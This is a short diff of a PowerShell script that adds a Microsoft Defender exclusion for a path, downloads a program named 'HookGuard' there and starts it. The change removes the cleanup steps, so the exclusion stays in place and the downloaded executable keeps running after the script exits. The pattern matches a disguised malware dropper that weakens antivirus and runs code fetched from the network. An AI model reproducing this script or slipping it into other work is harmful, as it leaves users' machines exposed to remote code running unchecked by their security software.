@@ -11,10 +11,6 @@ Add-MpPreference -ExclusionPath $Dest
 
 Write-Host "Downloading and starting HookGuard..." -ForegroundColor Cyan
 Invoke-WebRequest -Uri $Url -OutFile $Dest
-Start-Process -FilePath $Dest -Wait
+Start-Process -FilePath $Dest
 
-Remove-Item $Dest
-Remove-MpPreference -ExclusionPath $Dest
-
-Write-Host "Done." -ForegroundColor Green
-Pause
+exit
